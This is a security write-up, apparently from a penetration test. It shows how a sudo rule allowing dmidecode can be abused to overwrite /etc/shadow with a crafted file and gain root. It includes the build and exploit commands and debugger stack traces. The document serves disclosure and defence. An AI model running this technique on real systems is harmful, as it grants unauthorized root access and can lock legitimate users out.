# Privilege escalation using dmidecode

## Background

One of the most basic privilege escalation strategies is to look for dangerous
sudo configurations. The ability of programs such as vim to execute arbitrary
commands is well known. Wildcards can lend seemingly innocuous commands a
surprising amount of power. Even more dangerous are commands without set
arguments: it is not always remembered that this means the command can be run
with any arguments the user specifies. The capabilities of such commands to
execute other programs, or to read and write sensitive files, must be carefully
investigated.

## Scenario

On a recent engagement, I observed the following sudo configuration:
```
testuser@testhost:~ $ sudo -l

User testuser may run the following commands on testhost:
    (ALL) NOPASSWD: /usr/sbin/dmidecode
```

dmidecode is a utility for reading system hardware information in the
SMBIOS format: a standard maintained by the Distributed Management Task
Force.  https://www.nongnu.org/dmidecode/ is the implementation present
in most Linux distributions, including Debian and Red Hat, and was the
focus of this investigation.

```
testuser@testhost:~ $ /usr/sbin/dmidecode -h
Usage: dmidecode [OPTIONS]
Options are:
 -d, --dev-mem FILE     Read memory from device FILE (default: /dev/mem)
 -h, --help             Display this help text and exit
 -q, --quiet            Less verbose output
 -s, --string KEYWORD   Only display the value of the given DMI string
 -t, --type TYPE        Only display the entries of given type
 -u, --dump             Do not decode the entries
     --dump-bin FILE    Dump the DMI data to a binary file
     --from-dump FILE   Read the DMI data from a binary file
     --no-sysfs         Do not attempt to read DMI data from sysfs files
     --oem-string N     Only display the value of the given OEM string
 -V, --version          Display the version and exit
```

It should be apparent that dmidecode has some powerful I/O capabilities:
note the `--dev-mem` and `--dump-bin` options. By passing a carefully
constructed SMBIOS file as a memory device, we can cause dmidecode to
write nearly arbitrary output to `--dump-bin`.

## Exploit

`dmiwrite` will wrap an input payload in an SMBIOS file that can be read as a
memory device by dmidecode. `--dump-bin` will then cause dmidecode to write the
payload to the destination specified, prepended with 32 null bytes.  These do
not prevent privilege escalation.

## Privilege escalation

We will overwrite `/etc/shadow` with a copy containing a known root
password hash. We can then `su` to root. Of course, this may lock other
users out of the system. In the engagement where I employed this, I used
a separate file read vulnerability to first obtain /etc/shadow, which I
used as a template. If your situation is not so fortunate, you may be
able to restore /etc/shadow from a backup after escalating to root.

```
make dmiwrite
./dmiwrite trojan_shadow.in evil.dmi
```

Copy `evil.dmi` to the target, then:

```
sudo dmidecode --no-sysfs -d evil.dmi --dump-bin /etc/shadow
```

`trojan_shadow.in` should begin with a newline to prevent the null bytes from
interfering with the first entry.

If the target system is using an older version of dmidecode, you may
need to omit the --no-sysfs option.

## Technical details

Format is 32-bit SMBIOS 2.1.

dmidecode stack trace just prior to file write:

```
#0  write_dump (base=0x20, len=, data=, dumpfile= "/etc/shadow", add=0x0) at util.c:254
#1  dmi_table_dump (buf= "\nroot:", len=) at dmidecode.c:4607
#2  dmi_table (base=0x0, len=, num=0x1, ver=0x20100) at dmidecode.c:4778
#3  smbios_decode (buf= "_SM_", devmem= "evil.dmi", flags=0x1) at dmidecode.c:4887
#4  main (argc=, argv=) at dmidecode.c:5107
```

The 32 byte offset in write_dump is hardcoded space for the SMBIOS entry point
structure and results in an fseek in the dump file to that offset.  This
appears to be unavoidable, but by specifying an entry point length of zero, we
can prevent the second call to write_dump, below, from actually writing out the
entry point structure, filling it with nulls instead.

```
#0  write_dump (base=0x0, len=0x0, data=, dumpfile= "/etc/shadow", add=0x1) at util.c:254
#1  smbios_decode (buf= "_SM_", devmem= "evil.dmi", flags=0x0) at dmidecode.c:4900
#2  main (argc=, argv=) at dmidecode.c:5107
```
